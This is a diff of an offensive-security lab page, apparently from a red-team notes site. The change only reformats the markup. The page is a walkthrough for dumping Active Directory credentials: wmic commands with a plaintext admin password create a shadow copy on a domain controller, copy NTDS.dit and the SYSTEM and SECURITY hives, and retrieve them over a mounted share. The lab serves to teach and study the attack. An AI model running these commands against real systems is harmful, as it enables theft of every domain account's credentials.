@@ -8,25 +8,21 @@ This lab assumes the attacker has already gained administratrative access to the
 
 Create a shadow copy of the C drive of the Domain Controller:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/annotation-2019-05-23-213609.png)
 
 Copy the NTDS.dit, SYSTEM and SECURITY hives to C:\temp on the DC01:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Below shows the above command executed on the attacking machine \(right\) and the files being dumped to c:\temp on the DC01 on the left:
 
@@ -34,13 +30,11 @@ Below shows the above command executed on the attacking machine \(right\) and th
 
 Mount the DC01\c$\temp locally in order to retrieve the dumped files:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/annotation-2019-05-23-222654.png)
 
